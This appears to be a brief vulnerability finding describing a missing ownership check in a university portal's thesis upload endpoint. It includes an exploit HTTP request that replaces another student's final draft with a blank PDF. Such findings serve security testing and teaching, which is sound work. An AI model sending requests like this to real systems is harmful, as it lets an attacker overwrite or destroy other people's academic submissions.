diagnosis: The academic thesis upload endpoint accepts final draft PDFs and updates thesis_submissions by submissionId. Although authenticateStudent ensures the caller is an enrolled student, it does not verify that the student_id on the submission matches req.user.studentId. A malicious student can overwrite other students' graduating thesis submissions.
exploit_request:
POST /academic/submissions/sub_thesis_88402/final-draft HTTP/1.1
Host: portal.university.edu
Authorization: Bearer <student_jwt>
Content-Type: multipart/form-data; boundary=----ThesisBoundary

------ThesisBoundary
Content-Disposition: form-data; name="thesisPdf"; filename="blank_page.pdf"
Content-Type: application/pdf

%PDF-1.4...
------ThesisBoundary--
